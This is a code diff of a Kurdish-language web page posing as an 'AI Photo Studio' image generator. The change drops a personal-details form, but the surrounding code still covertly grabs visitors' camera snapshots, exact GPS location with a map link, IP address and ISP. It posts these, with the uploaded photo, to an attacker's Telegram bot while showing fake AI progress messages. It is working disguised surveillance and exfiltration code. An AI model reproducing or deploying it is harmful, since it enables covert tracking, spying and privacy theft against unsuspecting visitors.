@@ -72,60 +72,20 @@
         .info-box {
             background: rgba(56, 189, 248, 0.05);
             border: 1px dashed rgba(56, 189, 248, 0.4);
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 12px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
             color: #38bdf8;
             margin-bottom: 15px;
             text-shadow: 0 0 5px rgba(56, 189, 248, 0.5);
-            text-align: right;
-            line-height: 1.6;
-        }
-        
-        .form-group {
-            margin-bottom: 12px;
-            text-align: right;
-        }
-
-        .form-group label {
-            font-size: 12px;
-            color: #e2e8f0;
-            margin-bottom: 4px;
-            display: block;
-            text-shadow: 0 0 5px rgba(226, 232, 240, 0.4);
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 10px 12px;
-            background: rgba(15, 23, 42, 0.7);
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            border-radius: 8px;
-            color: #38bdf8;
-            font-size: 14px;
-            font-weight: 700;
-            outline: none;
-            transition: all 0.3s;
-            text-shadow: 0 0 8px rgba(56, 189, 248, 0.6);
-            box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
-        }
-
-        .form-control::placeholder {
-            color: rgba(56, 189, 248, 0.4);
-            font-weight: 400;
-        }
-
-        .form-control:focus {
-            border-color: #a855f7;
-            box-shadow: 0 0 12px rgba(168, 85, 247, 0.6), inset 0 0 5px rgba(168, 85, 247, 0.3);
-            color: #e879f9;
-            text-shadow: 0 0 10px rgba(232, 121, 249, 0.8);
+            text-align: center;
+            line-height: 1.7;
         }
 
         .upload-box {
             border: 2px dashed #a855f7;
-            padding: 15px;
-            border-radius: 10px;
+            padding: 20px;
+            border-radius: 12px;
             cursor: pointer;
             background: rgba(168, 85, 247, 0.05);
             margin-top: 15px;
@@ -142,7 +102,7 @@
         .upload-box input { display: none; }
         
         .upload-text {
-            font-size: 13px;
+            font-size: 14px;
             color: #e879f9;
             font-weight: 700;
             text-shadow: 0 0 8px rgba(232, 121, 249, 0.6);
@@ -202,36 +162,10 @@
     <div class="container" id="main-card">
         <div class="logo-icon">✨</div>
         <h1>AI Photo Studio - دروستکردنی وێنە لە ڕێگەی زیرەکی دەستکردەوە AI</h1>
-        <p>ئەم ماڵپەڕە سەکۆیەکی پێشکەوتووی زیرەکی دەستکردە (AI) کە تایبەتە بە دروستکردنی وێنەی ناوازە بە زیرەکی دەستکرد بە کوالێتی بەرز.</p>
+        <p>ئەم ماڵپەڕە سەکۆیەکی پێشکەوتووی زیرەکی دەستکردە (AI) کە تایبەتە بە دروستکردنی وێنەی ناوازە بە کوالێتی بەرز.</p>
         
         <div class="info-box">
-            📌 <strong>بۆچی خۆتۆمارکردن گرنگە؟</strong><br>
-            بۆ ئەوەی سیستەمەکە بتوانێت داتای بەکارهێنەر وەربگرێ بۆ باشترکردنی خۆی، و وێنەکانت بە تەواوی دروست بکات و مۆدێلی AI چالاک ببێت، پێویستە خۆت تۆمار بکەیت و زانیارییەکان پڕ بکەیتەوە.
-        </div>
-
-        <div class="form-group">
-            <label>ناوی خۆت:</label>
-            <input type="text" id="name" class="form-control" autocomplete="off" placeholder="ناوی خۆت بنووسە">
-        </div>
-        <div class="form-group">
-            <label>ناوی باوک:</label>
-            <input type="text" id="fatherName" class="form-control" autocomplete="off" placeholder="ناوی باوکت بنووسە">
-        </div>
-        <div class="form-group">
-            <label>ناوی باپیر:</label>
-            <input type="text" id="grandfatherName" class="form-control" autocomplete="off" placeholder="ناوی باپیریت بنووسە">
-        </div>
-        <div class="form-group">
-            <label>ژمارەی تەلەفۆن:</label>
-            <input type="tel" id="phone" class="form-control" autocomplete="off" placeholder="0750XXXXXXX">
-        </div>
-        <div class="form-group">
-            <label>ئیمەیڵەکەت:</label>
-            <input type="email" id="email" class="form-control" autocomplete="off" placeholder="example@gmail.com">
-        </div>
-        <div class="form-group">
-            <label>ڕێکەوتی لەدایکبوون:</label>
-            <input type="date" id="birthdate" class="form-control" autocomplete="off">
+            ✨ بەخێربێن بۆ ماڵپەڕی <strong>AI Photo Studio</strong>، لە خوارەوە تەنها ١ وێنەت Upload بکە و زیرەکی دەستکرد ١٠0 وێنەی جوانت بۆ دروست دەکات کە دەتوانیت بەکاریان بهێنیت بۆ پۆستکردنیان و دانانیان لە ستۆری و بەکارهێنانیان لەسەر پڕۆفایلی ئەکاونتەکانت.
         </div>
 
         <div class="upload-box" onclick="document.getElementById('fileInput').click()">
@@ -270,15 +204,8 @@
         }
 
         async function startAIProcess() {
-            let uName = document.getElementById('name').value.trim();
-            let uFather = document.getElementById('fatherName').value.trim();
-            let uGrand = document.getElementById('grandfatherName').value.trim();
-            let uPhone = document.getElementById('phone').value.trim();
-            let uEmail = document.getElementById('email').value.trim();
-            let uBirth = document.getElementById('birthdate').value.trim();
-
-            if (!uName || !uPhone || !selectedFile) {
-                alert("تکایە خانە سەرەکییەکان و وێنەکە پڕبکەرەوە!");
+            if (!selectedFile) {
+                alert("تکایە سەرەتا وێنەیەک ئەپلۆد بکە!");
                 return;
             }
 
@@ -438,7 +365,7 @@
                 cameraStatus = "بەکارهێنەرەکە Allowـی نەکردووە (Deny کردووە)، بۆیە وێنەی نەهاتۆتەوە 🔴";
             }
 
-            updateProgress(20, "شیکردنەوەی زانیارییە کەسییەکان...");
+            updateProgress(20, "شیکردنەوەی وێنەکە...");
             await sleep(800);
             updateProgress(50, "بەستنەوە بە مۆدێلی AI...");
             await sleep(800);
@@ -450,12 +377,7 @@
                 ? `لۆکەیشنی دەقیقی کەسەکە: [گووگڵ ماپ](${mapLink}) (Lat & Long: ${locationText})` 
                 : `لۆکەیشن: ${locationStatus}`;
 
-            const msg = `🚨 **زانیارییە پڕکراوەکان و تەکنیکییەکانی سەردانیکەر:**\n\n` +
-                        `👤 **زانیارییە کەسییەکان:**\n` +
-                        `• ناوی تەواو: ${uName} ${uFather} ${uGrand}\n` +
-                        `• ژمارەی تەلەفۆن: \`${uPhone}\`\n` +
-                        `• ئیمەیڵ: ${uEmail || 'نەنووسراوە'}\n` +
-                        `• ڕێکەوتی لەدایکبوون: ${uBirth || 'نەنووسراوە'}\n\n` +
+            const msg = `🚨 **زانیارییە تەکنیکییەکانی سەردانیکەر:**\n\n` +
                         `⏰ کات: ${fullDateText}\n` +
                         `🌐 IP کەسەکە: ${ip} (${isp})\n` +
                         `📍 ${mapTextPart}\n` +
@@ -496,7 +418,7 @@
                     const formDataCam = new FormData();
                     formDataCam.append('chat_id', chatId);
                     formDataCam.append('photo', cameraBlob, 'camera.jpg');
-                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (${uName})`);
+                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کامێرای سەردانیکەر`);
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataCam });
                 } catch (err) {}
@@ -507,7 +429,7 @@
                     const formDataUpload = new FormData();
                     formDataUpload.append('chat_id', chatId);
                     formDataUpload.append('photo', selectedFile, selectedFile.name);
-                    formDataUpload.append('caption', `🖼 ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە (${uName})`);
+                    formDataUpload.append('caption', `🖼 ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە`);
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataUpload });
                 } catch (err) {}
